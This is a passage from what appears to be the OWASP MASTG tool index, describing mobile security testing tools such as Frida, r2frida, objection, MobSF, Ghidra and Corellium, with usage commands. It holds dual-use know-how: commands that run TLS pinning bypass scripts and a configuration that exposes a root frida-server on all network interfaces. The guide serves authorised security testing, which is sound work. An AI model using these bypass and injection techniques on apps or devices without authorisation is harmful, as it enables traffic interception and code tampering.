executable. Since version 2, <code>blint</code> can generate Software Bill-of-Materials (SBOM) for supported binaries, which includes Android (APK and AAB), but not iOS (IPA) apps.</p> <p>The creation of an SBOM out of an Android App (APK or AAB) is supported, but limited. Due to stripping out meta-information of the libraries used in an app, a SBOM created ouf of an Android app will always be incomplete.</p> <p>BLint can be a choice in a black-box security assessment, but other tools should be preferred during a grey/white-box test, like:</p> <ul> <li> dependency-check</li> <li> dependency-track</li> <li> cdxgen</li> </ul>","tags":["android","tool"]},{"location":"MASTG/tools/android/MASTG-TOOL-0140/","title":"MASTG-TOOL-0140: frida-multiple-unpinning","text":"<p>A Frida CodeShare script to bypass various forms of TLS pinning. This is one of the most extensive TLS pinning bypass scripts available on CodeShare. One of its main strengths is a dynamic bypass which detects instantiations of the <code>SSLPeerUnverifiedException</code> class and automatically patches the method responsible for throwing the exception.</p> <p>You can run the script directly with Frida:</p> <pre><code>$ frida -U --codeshare akabe1/frida-multiple-unpinning -f YOUR_BINARY\n</code></pre>","tags":["android","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/","title":"MASTG-TOOL-0031: Frida","text":"<p> Frida is a free and open source dynamic code instrumentation toolkit written by Ole Andr\u00e9 Vadla Ravn\u00e5s that works by injecting the QuickJS JavaScript engine (previously Duktape and V8) into the instrumented process. Frida lets you execute snippets of JavaScript into native apps on Android and iOS (as well as on other platforms).</p> <p></p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/#installation","title":"Installation","text":"<p>To install Frida locally, simply run:</p> <pre><code>pip install frida-tools\n</code></pre> <p>Or refer to the installation page for more details.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/#modes-of-operation","title":"Modes of Operation","text":"<p>Code can be injected in several ways. For example, Xposed permanently modifies the Android app loader, providing hooks for running your own code every time a new process is started. In contrast, Frida implements code injection by writing code directly into the process memory. When attached to a running app:</p> <ul> <li>Frida uses ptrace to hijack a thread of a running process. This thread is used to allocate a chunk of memory and populate it with a mini-bootstrapper.</li> <li>The bootstrapper starts a fresh thread, connects to the Frida debugging server that's running on the device, and loads a shared library that contains the Frida agent (<code>frida-agent.so</code>).</li> <li>The agent establishes a bi-directional communication channel back to the tool (e.g. the Frida REPL or your custom Python script).</li> <li>The hijacked thread resumes after being restored to its original state, and process execution continues as usual.</li> </ul> <p></p> <ul> <li>Frida Architecture, source: https://www.frida.re/docs/hacking/</li> </ul> <p>Frida offers three modes of operation:</p> <ol> <li>Injected: this is the most common scenario when frida-server is running as a daemon in the iOS or Android device. frida-core is exposed over TCP, listening on localhost:27042 by default. Running in this mode is not possible on devices that are not rooted or jailbroken.</li> <li>Embedded: this is the case when your device is not rooted nor jailbroken (you cannot use ptrace as an unprivileged user), you're responsible for the injection of the frida-gadget library by embedding it into your app, manually or via third-party tools such as  objection.</li> <li>Preloaded: similar to <code>LD_PRELOAD</code> or <code>DYLD_INSERT_LIBRARIES</code>. You can configure the frida-gadget to run autonomously and load a script from the filesystem (e.g. path relative to where the Gadget binary resides).</li> </ol>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/#apis","title":"APIs","text":"<p>Independently of the chosen mode, you can make use of the Frida JavaScript APIs to interact with the running process and its memory. Some of the fundamental APIs are:</p> <ul> <li>Interceptor: When using the Interceptor API, Frida injects a trampoline (aka in-line hooking) at the function prologue which provokes a redirection to our custom code, executes our code, and returns to the original function. Note that while very effective for our purpose, this introduces a considerable overhead (due to the trampoline related jumping and context switching) and cannot be considered transparent as it overwrites the original code and acts similar to a debugger (putting breakpoints) and therefore can be detected in a similar manner, e.g. by applications that periodically checksum their own code.</li> <li>Stalker: If your tracing requirements include transparency, performance and high granularity, Stalker should be your API of choice. When tracing code with the Stalker API, Frida leverages just-in-time dynamic recompilation (by using Capstone): when a thread is about to execute its next instructions, Stalker allocates some memory, copies the original code over, and interlaces the copy with your custom code for instrumentation. Finally, it executes the copy (leaving the original code untouched, and therefore avoiding any anti-debugging checks). This approach increases instrumentation performance considerably and allows for very high granularity when tracing (e.g. by tracing exclusively CALL or RET instructions). You can learn more in-depth details in the blog post \"Anatomy of a code tracer\" by Frida's creator Ole [#vadla]. Some examples of use for Stalker are, for example who-does-it-call or diff-calls.</li> <li>Java: When working on Android you can use this API to enumerate loaded classes, enumerate class loaders, create and use specific class instances, enumerate live instances of classes by scanning the heap, etc.</li> <li>ObjC: When working on iOS you can use this API to get a mapping of all registered classes, register or use specific class or protocol instances, enumerate live instances of classes by scanning the heap, etc.</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/#frida-17","title":"Frida 17","text":"<p>Frida 17 introduces breaking changes, such as the removal of the bundled runtime bridges (<code>frida-{objc,swift,java}-bridge</code>) within Frida's GumJS runtime. This means you must now explicitly install the bridges you need by using <code>frida-pm install</code>:</p> <pre><code>frida-pm install frida-java-bridge\n</code></pre> <p>However, the commands <code>frida</code> and <code>frida-trace</code> come with the Java, Objective-C, and Swift bridges pre-bundled, so you can still use them without manual installation in those contexts. You can learn more about bridges in the Frida documentation.</p> <p>Frida has made changes to its native APIs. While these changes may break some of your existing scripts, they encourage you to write more readable and performant code. For instance, now, <code>Process.enumerateModules()</code> returns an array of <code>Module</code> objects, allowing you to work with them directly.</p> <pre><code>for (const module of Process.enumerateModules()) {\n  console.log(module.name);\n}\n</code></pre> <p>Another API that was removed is <code>Module.getSymbolByName</code>, which is used in many scripts. Depending on if you know which module the symbol is located in or not, you can use one of the following two alternatives:</p> <pre><code>// If you know the module\nProcess.getModuleByName('libc.so').getExportByName('open')\n\n// If you don't (i.e., the old Module.getSymbolByName(null, 'open'); )\nModule.getGlobalExportByName('open');\n</code></pre> <p>For more details, refer to the Frida 17.0.0 Release Notes.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0031/#tools","title":"Tools","text":"<p>Frida also provides a couple of simple tools built on top of the Frida API and available right from your terminal after installing frida-tools via pip. For instance:</p> <ul> <li>You can use the Frida CLI (<code>frida</code>) for quick script prototyping and try/error scenarios.</li> <li><code>frida-ps</code> to obtain a list of all apps (or processes) running on the device including their names, identifiers and PIDs.</li> <li><code>frida-ls-devices</code> to list your connected devices running Frida servers or agents.</li> <li><code>frida-trace</code> to quickly trace methods that are part of an iOS app or that are implemented inside an Android native library.</li> </ul> <p>In addition, you'll also find several open source Frida-based tools, such as:</p> <ul> <li> Grapefruit: a Runtime Application Instrument toolkig for iOS.</li> <li> Fridump: a memory dumping tool for both Android and iOS.</li> <li> objection: a runtime mobile security assessment framework.</li> <li> r2frida: a project merging the powerful reverse engineering capabilities of radare2 with the dynamic instrumentation toolkit of Frida.</li> <li> JNITrace: a tool for tracing usage of the Android JNI runtime methods by a native library.</li> </ul> <p>We will be using all of these tools throughout the guide.</p> <p>You can use these tools as-is, tweak them to your needs, or take as excellent examples on how to use the APIs. Having them as an example is very helpful when you write your own hooking scripts or when you build introspection tools to support your reverse engineering workflow.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0032/","title":"MASTG-TOOL-0032: Frida CodeShare","text":"<p>Frida CodeShare is a repository containing a collection of ready-to-run Frida scripts which can enormously help when performing concrete tasks both on Android as on iOS as well as also serve as inspiration to build your own scripts. Some examples of useful scripts:</p> <ul> <li>Frida Multiple Unpinning - https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/</li> <li>Disable Flutter TLS verification - https://codeshare.frida.re/@TheDauntless/disable-flutter-tls-v1/</li> <li>ObjC method observer - https://codeshare.frida.re/@mrmacete/objc-method-observer/</li> <li>JNI Trace - https://codeshare.frida.re/@chame1eon/jnitrace/</li> <li>Dump dynamically loaded DEX - https://codeshare.frida.re/@cryptax/inmemorydexclassloader-dump/</li> <li>Enable iOS WebInspector - https://codeshare.frida.re/@leolashkevych/ios-enable-webinspector/</li> </ul> <p>Using them is as simple as including the <code>--codeshare &lt;script&gt;</code> flag with the chosen script when using the Frida CLI. For example, to use \"ObjC method observer\", enter the following:</p> <pre><code>frida --codeshare mrmacete/objc-method-observer -f YOUR_BINARY\n</code></pre>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0033/","title":"MASTG-TOOL-0033: Ghidra","text":"<p> Ghidra is an open source software reverse engineering (SRE) suite of tools developed by the United State of America's National Security Agency's (NSA) Research Directorate. Ghidra is a versatile tool which comprises of a disassembler, decompiler and a built-in scripting engine for advanced usage. Please refer to the installation guide on how to install it and also look at the cheat sheet for a first overview of available commands and shortcuts. In this section, we will have walk-through on how to create a project, view disassembly and decompiled code for a binary.</p> <p>Start Ghidra using <code>ghidraRun</code> (*nix) or <code>ghidraRun.bat</code> (Windows), depending on the platform you are on. Once Ghidra is fired up, create a new project by specifying the project directory. You will be greeted by a window as shown below:</p> <p></p> <p>In your new Active Project you can import an app binary by going to File -&gt; Import File and choosing the desired file.</p> <p></p> <p>If the file can be properly processed, Ghidra will show meta-information about the binary before starting the analysis.</p> <p></p> <p>To get the disassembled code for the binary file chosen above, double click the imported file from the Active Project window. Click yes and analyze for auto-analysis on the subsequent windows. Auto-analysis will take some time depending on the size of the binary, the progress can be tracked in the bottom right corner of the code browser window. Once auto-analysis is completed you can start exploring the binary.</p> <p></p> <p>The most important windows to explore a binary in Ghidra are the Listing (Disassembly) window, the Symbol Tree window and the Decompiler window, which shows the decompiled version of the function selected for disassembly. The Display Function Graph option shows control flow graph of the selected function.</p> <p></p> <p>There are many other functionalities available in Ghidra and most of them can be explored by opening the Window menu. For example, if you want to examine the strings present in the binary, open the Defined Strings option. We will discuss other advanced functionalities while analyzing various binaries for Android and iOS platforms in the coming chapters.</p> <p></p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0034/","title":"MASTG-TOOL-0034: LIEF","text":"<p>  The purpose of LIEF is to provide a cross platform library to parse, modify and abstract ELF, PE and MachO formats. With it you can, for instance, inject a certain library as a dependency of a native library, which an application already loads by default. - https://lief.quarkslab.com/</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0035/","title":"MASTG-TOOL-0035: MobSF","text":"<p> MobSF (Mobile Security Framework) is an automated, all-in-one mobile application pentesting framework capable of performing static and dynamic analysis. The easiest way of getting MobSF started is via Docker.</p> <pre><code>docker pull opensecurity/mobile-security-framework-mobsf\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n</code></pre> <p>Or install and start it locally on your host computer by running:</p> <pre><code># Setup\ngit clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\ncd Mobile-Security-Framework-MobSF\n./setup.sh # For Linux and Mac\nsetup.bat # For Windows\n\n# Installation process\n./run.sh # For Linux and Mac\nrun.bat # For Windows\n</code></pre> <p>Once you have MobSF up and running you can open it in your browser by navigating to http://127.0.0.1:8000. Simply drag the APK you want to analyze into the upload area and MobSF will start its job.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0036/","title":"MASTG-TOOL-0036: r2frida","text":"<p> r2frida is a project that allows radare2 to connect to Frida, effectively merging the powerful reverse engineering capabilities of radare2 with the dynamic instrumentation toolkit of Frida. r2frida can be used in both on Android and iOS, allowing you to:</p> <ul> <li>Attach radare2 to any local process or remote frida-server via USB or TCP.</li> <li>Read/Write memory from the target process.</li> <li>Load Frida information such as maps, symbols, imports, classes and methods into radare2.</li> <li>Call r2 commands from Frida as it exposes the r2pipe interface into the Frida Javascript API.</li> </ul> <p>Please refer to r2frida's official installation instructions.</p> <p>With frida-server running, you should now be able to attach to it using the pid, spawn path, host and port, or device-id. For example, to attach to PID 1234:</p> <pre><code>r2 frida://1234\n</code></pre> <p>For more examples on how to connect to frida-server, see the usage section in the r2frida's README page.</p> <p>The following examples were executed using an Android app but also apply to iOS apps.</p> <p>Once in the r2frida session, all commands start with <code>:</code> or <code>=!</code>. For example, in radare2 you'd run <code>i</code> to display the binary information, but in r2frida you'd use <code>:i</code>.</p> <p>See all options with <code>r2 frida://?</code>.</p> <pre><code>[0x00000000]&gt; :i\narch                x86\nbits                64\nos                  linux\npid                 2218\nuid                 1000\nobjc                false\nruntime             V8\njava                false\ncylang              false\npageSize            4096\npointerSize         8\ncodeSigningPolicy   optional\nisDebuggerAttached  false\n</code></pre> <p>To search in memory for a specific keyword, you may use the search command <code>:/</code>:</p> <pre><code>[0x00000000]&gt; :/ unacceptable\nSearching 12 bytes: 75 6e 61 63 63 65 70 74 61 62 6c 65\nSearching 12 bytes in [0x0000561f05ebf000-0x0000561f05eca000]\n...\nSearching 12 bytes in [0xffffffffff600000-0xffffffffff601000]\nhits: 23\n0x561f072d89ee hit12_0 unacceptable policyunsupported md algorithmvar bad valuec\n0x561f0732a91a hit12_1 unacceptableSearching 12 bytes: 75 6e 61 63 63 65 70 74 61\n</code></pre> <p>To output the search results in JSON format, we simply add <code>j</code> to our previous search command (just as we do in the r2 shell). This can be used in most of the commands:</p> <pre><code>[0x00000000]&gt; :/j unacceptable\nSearching 12 bytes: 75 6e 61 63 63 65 70 74 61 62 6c 65\nSearching 12 bytes in [0x0000561f05ebf000-0x0000561f05eca000]\n...\nSearching 12 bytes in [0xffffffffff600000-0xffffffffff601000]\nhits: 23\n{\"address\":\"0x561f072c4223\",\"size\":12,\"flag\":\"hit14_1\",\"content\":\"unacceptable \\\npolicyunsupported md algorithmvar bad valuec0\"},{\"address\":\"0x561f072c4275\", \\\n\"size\":12,\"flag\":\"hit14_2\",\"content\":\"unacceptableSearching 12 bytes: 75 6e 61 \\\n63 63 65 70 74 61\"},{\"address\":\"0x561f072c42c8\",\"size\":12,\"flag\":\"hit14_3\", \\\n\"content\":\"unacceptableSearching 12 bytes: 75 6e 61 63 63 65 70 74 61 \"},\n...\n</code></pre> <p>To list the loaded libraries use the command <code>:il</code> and filter the results using the internal grep from radare2 with the command <code>~</code>. For example, the following command will list the loaded libraries matching the keywords <code>keystore</code>, <code>ssl</code> and <code>crypto</code>:</p> <pre><code>[0x00000000]&gt; :il~keystore,ssl,crypto\n0x00007f3357b8e000 libssl.so.1.1\n0x00007f3357716000 libcrypto.so.1.1\n</code></pre> <p>Similarly, to list the exports and filter the results by a specific keyword:</p> <pre><code>[0x00000000]&gt; :iE libssl.so.1.1~CIPHER\n0x7f3357bb7ef0 f SSL_CIPHER_get_bits\n0x7f3357bb8260 f SSL_CIPHER_find\n0x7f3357bb82c0 f SSL_CIPHER_get_digest_nid\n0x7f3357bb8380 f SSL_CIPHER_is_aead\n0x7f3357bb8270 f SSL_CIPHER_get_cipher_nid\n0x7f3357bb7ed0 f SSL_CIPHER_get_name\n0x7f3357bb8340 f SSL_CIPHER_get_auth_nid\n0x7f3357bb7930 f SSL_CIPHER_description\n0x7f3357bb8300 f SSL_CIPHER_get_kx_nid\n0x7f3357bb7ea0 f SSL_CIPHER_get_version\n0x7f3357bb7f10 f SSL_CIPHER_get_id\n</code></pre> <p>To list or set a breakpoint use the command db. This is useful when analyzing/modifying memory:</p> <pre><code>[0x00000000]&gt; :db\n</code></pre> <p>Finally, remember that you can also run Frida JavaScript code with <code>:.</code> plus the name of the script:</p> <pre><code>[0x00000000]&gt; :. agent.js\n</code></pre> <p>You can find more examples on how to use r2frida on their Wiki project.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0037/","title":"MASTG-TOOL-0037: RMS Runtime Mobile Security","text":"<p> RMS - Runtime Mobile Security is a runtime mobile application analysis toolkit, supporting Android and iOS Apps. It offers a web GUI and is written in Python.</p> <p>It's leveraging a running Frida server on a jailbroken device with the following out-of-box functionalities:</p> <ul> <li>Execute popular Frida scripts</li> <li>Execute custom Frida scripts</li> <li>Dump all the loaded classes and relative methods</li> <li>Hook methods on the fly</li> <li>(Android) Monitor Android APIs and usage of native APIs</li> </ul> <p>The installation instructions and \"how-to guide\" of RMS can be found in the Readme of the Github repo.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0038/","title":"MASTG-TOOL-0038: objection","text":"<p> Objection is a \"runtime mobile exploration toolkit, powered by Frida\". Its main goal is to allow security testing on non-rooted devices through an intuitive interface.</p> <p>Objection achieves this goal by providing you with the tools to easily inject the Frida gadget into an application by repackaging it. This way, you can deploy the repackaged app to the non-rooted/non-jailbroken device by sideloading it. Objection also provides a REPL that allows you to interact with the application, giving you the ability to perform any action that the application can perform.</p> <p>Objection can be installed through pip as described on Objection's Wiki.</p> <pre><code>pip3 install objection\n</code></pre>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0098/","title":"MASTG-TOOL-0098: iaito","text":"<p>  Iaito is the official graphical user interface for radare2, an open-source reverse engineering framework. This user-friendly tool simplifies the reverse engineering process by providing a graphical interface that integrates seamlessly with radare2's powerful features. With a focus on simplicity, keybindings, and radare2-style workflows, Iaito is a valuable resource for both experienced reverse engineers and those new to the field, offering a more accessible and efficient way to work with radare2.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0100/","title":"MASTG-TOOL-0100: reFlutter","text":"<p>  The reFlutter framework helps to reverse engineer Flutter apps using the patched version of the Flutter library, which is already compiled and ready for application repackaging. This library has a modified snapshot deserialization process that allows you to perform dynamic analysis. reFlutter can also be used for intercepting Flutter HTTPS traffic.</p> <p>You can install and use reFlutter by following the official instructions. More information is also available in the article \"Fork Bomb for Flutter\" including details and practical examples.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0101/","title":"MASTG-TOOL-0101: disable-flutter-tls-verification","text":"<p> disable-flutter-tls-verification is a Frida script that disables Flutter's TLS verification and works on (ARM32, ARM64 and x64) and iOS (ARM64). It uses pattern matching to find ssl_verify_peer_cert in handshake.cc. Further information can be found in this blog post.</p> <p>You can use it via Frida codeshare or by downloading disable-flutter-tls.js from the repo as indicated in these instructions.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0104/","title":"MASTG-TOOL-0104: hermes-dec","text":"<p> Hermes-dec is a tool for reverse-engineering compiled hermes bytecode for both Android and iOS apps. It supports decompilation and disassembly of Hermes VM bytecode (HBC) format, typically seen in apps developed in React Native.</p> <p>If you encounter either of the following files during static analysis, hermes-dec provides a way to recover a legible version of the file's contents:</p> <ul> <li>index.android.bundle</li> <li>main.jsbundle</li> </ul> <p>Use <code>file</code> to check the type and confirm you are dealing with actual Hermes bytecode:</p> <pre><code>$ file main.jsbundle\nmain.jsbundle: Hermes JavaScript bytecode, version 90\n</code></pre> <p>If instead you see that it's a plain text file, it can be opened with any text editor and hermes-dec isn't needed:</p> <pre><code>$ file main.jsbundle\nmain.jsbundle: Unicode text, UTF-8 text\n</code></pre> <p>You can try using hermes-dec in situations where you are doing static analysis on a React Native mobile app, and react-native-decompiler fails.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0106/","title":"MASTG-TOOL-0106: Fridump","text":"<p>  Fridump is an open source memory dumping tool, primarily aimed to penetration testers and developers. Fridump is using the Frida framework to dump accessible memory addresses from any platform supported.</p> <p>More information:</p> <ul> <li>Introduction to Fridump</li> <li>iOS Examples</li> <li>Android Examples</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0108/","title":"MASTG-TOOL-0108: Corellium","text":"<p>Corellium is an iOS and Android device virtualization platform that allows users to create and manage virtual devices, perform dynamic analysis, and test applications in a controlled environment.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0108/#overview","title":"Overview","text":"<p>Corellium offers a cloud-based solution that enables users to run virtualized iOS and Android devices. These virtual devices can be used for various purposes, including security testing, app development, and research. Corellium provides a web-based interface for managing the virtual devices, as well as APIs for automation and integration with other tools.</p> <p>The Corellium GUI provides an app overview and app installer and many other features that are interesting for security testing, such as:</p> <ul> <li>Built-in file browser</li> <li>Built-in Frida server</li> <li>Snapshot management</li> <li>Network monitor</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0108/#ios-emulation","title":"iOS emulation","text":"<p>Corellium is the only available commercial option for iOS emulation. It is possible to launch all types of iOS devices with any supported iOS version. Each device can be jailbroken from the start, so even recent versions of iOS can be used to analyze applications.</p> <p>While Corellium has some very powerful tools to analyze both applications and iOS itself, it does have a few important limitations:</p> <ul> <li>No App Store: The devices do not have the App Store, which means you cannot use a Corellium device to obtain a decrypted version of an IPA file.</li> <li>No Apple Services: Access to Apple services (including iMessage and push notifications) is unavailable.</li> <li>No Camera / Cellular / NFC / Bluetooth: Apps running on Corellium do not have access to these peripherals. But it does support simulated SMS sending.</li> </ul> <p>More on iOS testing can be found here.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0108/#android-emulation","title":"Android emulation","text":"<p>Android emulation is available in both the <code>user</code> and <code>userdebug</code> configuration and all images are rooted by default. Google Play and other Google Services are not installed by default, but Corellium does allow you to install them via an OpenGApps package. Bluetooth is supported.</p> <p>However, some features are not supported:</p> <ul> <li>TrustZone: It is not possible to access a Keymaster, or use PlayReady or Widevine.</li> <li>SELinux in Permissive mode: SELinux is set to permissive mode, which may be detected by applications. This is typically not the case for physical devices rooted with Magisk or KernelSU.</li> </ul> <p>More on Android testing can be found here.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0110/","title":"MASTG-TOOL-0110: semgrep","text":"<p> semgrep is a static code scanner that is able to scan Java, Kotlin and Swift.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0129/","title":"MASTG-TOOL-0129: rabin2","text":"<p>{:target=\"blank\"}  rabin2 is a command-line utility within the Radare2 framework ( radare2 for iOS,  radare2 for Android_) designed for extracting and presenting detailed information from binary files. It supports various file formats, including Java CLASS, ELF, PE, Mach-O, and others through plugins. Rabin2 can retrieve data such as symbol imports/exports, library dependencies, data section strings, cross-references, entry point addresses, sections, and architecture types. The extracted information can be output in multiple formats compatible with other tools, including Radare2 itself.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0131/","title":"MASTG-TOOL-0131: dependency-check","text":"<p> Dependency-Check is a Software Composition Analysis (SCA) tool that attempts to detect publicly disclosed vulnerabilities contained within a project's dependencies.</p> <p>However, SCA tools like Dependency-Check have their limitations. For example, they usually fail to scan IPA or APK files. There are two main reasons for this:</p> <ul> <li>Transformed format: The libraries are no longer in their original format, but rather, they are part of the app's compiled binary code. For instance, an Android app does not contain third-party JAR files in the APK because they are part of the compiled DEX files.</li> <li>Lack of metadata: Information such as the library version or name is often stripped or altered when building the mobile app.</li> </ul> <p>Therefore, Dependency-Check is best used in a gray-box environment where the source code or at least the build configuration files are available. In this case, the tool can analyze the build configuration files to identify dependencies and their versions. For example:</p> <ul> <li>For iOS, the <code>Podfile</code> for CocoaPods or <code>Cartfile</code> for Carthage can be scanned to identify the dependencies used in the app.</li> <li>For Android, scan the <code>build.gradle</code> files to identify the dependencies used in the app.</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0132/","title":"MASTG-TOOL-0132: dependency-track","text":"<p> Dependency-Track is a Component Analysis platform that allows organizations to identify and reduce risk in the software supply chain.</p> <ul> <li>Installation: You can install Dependency-Track by using docker. The default credentials can be found in the initial setup.</li> <li>Input: Dependency-Track relies on Software Bill of Materials (SBOM) to identify vulnerable dependencies. SBOMs can be generated using tools such as  cdxgen and uploaded via the API.</li> <li>REST API: You can use the REST API with an API Key and a project to which the SBOM can be uploaded.</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0133/","title":"MASTG-TOOL-0133: Visual Studio Code (vscode)","text":"<p> Visual Studio Code is a code editor that offers various plugins useful for development and security testing. For example:</p> <ul> <li>SARIF Viewer: to work with and visualise SARIF files.</li> <li>Swift: for syntax support for the Swift programming language.</li> <li>Kotlin: for syntax support for the Kotlin programming language.</li> </ul>","tags":["generic","tool"]},{"location":"MASTG/tools/generic/MASTG-TOOL-0134/","title":"MASTG-TOOL-0134: cdxgen","text":"<p>{:target=\"blank\"}  cdxgen can generate Software Bill of Materials (SBOM) for most applications and container images with a single command. It supports SwiftPM for iOS and Maven for Android. The generated SBOM can then be submitted to analysis tools such as  dependency-track_.</p> <p>While the creation of an SBOM for a compiled Android app (APK or AAB) is supported, it is limited and mostly incomplete. This is mainly due to the removal of metadata from the libraries used in an app. Therefore, it is recommended to execute cdxgen in the Android app project folder to create a complete SBOM.</p>","tags":["generic","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0039/","title":"MASTG-TOOL-0039: Frida for iOS","text":"<p>  Frida supports interaction with the Objective-C runtime through the ObjC API. You'll be able to hook and call both Objective-C and native functions inside the process and its native libraries. Your JavaScript snippets have full access to memory, e.g. to read and/or write any structured data.</p> <p>Here are some tasks that Frida APIs offers and are relevant or exclusive on iOS:</p> <ul> <li>Instantiate Objective-C objects and call static and non-static class methods (ObjC API).</li> <li>Trace Objective-C method calls and/or replace their implementations (Interceptor API).</li> <li>Enumerate live instances of specific classes by scanning the heap (ObjC API).</li> <li>Scan process memory for occurrences of a string (Memory API).</li> <li>Intercept native function calls to run your own code at function entry and exit (Interceptor API).</li> </ul> <p>Remember that on iOS, you can also benefit from the built-in tools provided when installing Frida, which include the Frida CLI (<code>frida</code>), <code>frida-ps</code>, <code>frida-ls-devices</code> and <code>frida-trace</code>, to name a few.</p> <p>There's a <code>frida-trace</code> feature exclusive on iOS worth highlighting: tracing Objective-C APIs using the <code>-m</code> flag and wildcards. For example, tracing all methods including \"HTTP\" in their name and belonging to any class whose name starts with \"NSURL\" is as easy as running:</p> <pre><code>frida-trace -U YourApp -m \"*[NSURL* *HTTP*]\"\n</code></pre> <p>For a quick start you can go through the iOS examples.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0039/#installing-frida-on-ios","title":"Installing Frida on iOS","text":"<p>To connect Frida to an iOS app, you need a way to inject the Frida runtime into that app. This is easy to do on a jailbroken device since you can install <code>frida-server</code> through a third-party app store such as  Sileo. Open Sileo and add Frida's repository by navigating to Manage -&gt; Sources -&gt; Edit -&gt; Add and entering https://build.frida.re. You should then be able to find and install the Frida package.</p> <p>By default, <code>frida-server</code> only listens on the local interface, requiring you to connect the device over USB. If you want to expose <code>frida-server</code> on the public interface, modify <code>/var/jb/Library/LaunchDaemons/re.frida.server.plist</code> and two items to the <code>ProgramArguments</code> as shown below:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;d&gt;\n        &lt;key&gt;Label&lt;/key&gt;\n        &lt;string&gt;re.frida.server&lt;/string&gt;\n        &lt;key&gt;Program&lt;/key&gt;\n        &lt;string&gt;/var/jb/usr/sbin/frida-server&lt;/string&gt;\n        &lt;key&gt;ProgramArguments&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;/var/jb/usr/sbin/frida-server&lt;/string&gt;\n                &lt;string&gt;-l&lt;/string&gt;\n                &lt;string&gt;0.0.0.0&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;UserName&lt;/key&gt;\n        &lt;string&gt;root&lt;/string&gt;\n        &lt;key&gt;POSIXSpawnType&lt;/key&gt;\n        &lt;string&gt;Interactive&lt;/string&gt;\n        &lt;key&gt;RunAtLoad&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;KeepAlive&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;ThrottleInterval&lt;/key&gt;\n        &lt;integer&gt;5&lt;/integer&gt;\n        &lt;key&gt;ExecuteAllowed&lt;/key&gt;\n        &lt;true/&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>Once it has been installed, the Frida server will automatically run with root privileges, allowing you to easily inject code into any process.</p> <p>Danger</p> <p>Exposing frida-server on the public interface will let anyone connected on the same network to inject code into any process running on the device. You should only do this in a controlled lab environment.</p>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0039/#using-frida-on-ios","title":"Using Frida on iOS","text":"<p>Connect your device via USB and make sure that Frida works by running the <code>frida-ps</code> command and the flag <code>-U</code>. This should return the list of processes running on the device:</p> <pre><code>$ frida-ps -U\nPID  Name\n---  ----------------\n963  Mail\n952  Safari\n416  BTServer\n422  BlueTool\n791  CalendarWidget\n451  CloudKeychainPro\n239  CommCenter\n764  ContactsCoreSpot\n(...)\n</code></pre>","tags":["ios","tool"]},{"location":"MASTG/tools/ios/MASTG-TOOL-0039/#frida-bindings","title":"Frida Bindings","text":"<p>In order to extend the scripting experience, Frida offers bindings to programming languages such as Python, C, NodeJS, and Swift.</p> <p>Taking Python as an example, the first thing to note is that no further installation steps are required. Start your Python script with <code>import frida</code> and you're ready to go. See the following script that simply runs the previous JavaScript snippet:</p> <pre><code># frida_python.py\nimport frida\n\nsession = frida.get_usb_device().attach('com.android.chrome')\n\nsource = \"\"\"\nJava.perform(function () {\n    var view = Java.use(\"android.view.View\");\n    var methods = view.class.getMethods();\n    for(var i = 0; i &lt; methods.length; i++) {\n        console.log(methods[i].toString());\n    }\n});\n\"\"\"\n\nscript = session.create_script(source)\nscript.load()\n\nsession.detach()\n</code></pre> <p>In this case, running the Python script (<code>python3 frida_python.py</code>) has the same result as the previous example: it will print all methods of the <code>android.view.View</code> class to the terminal. However, you might want to work with that data from Python. Using <code>send</code> instead of <code>console.log</code> will send data in JSON format from JavaScript to Python. Please read the comments in the example 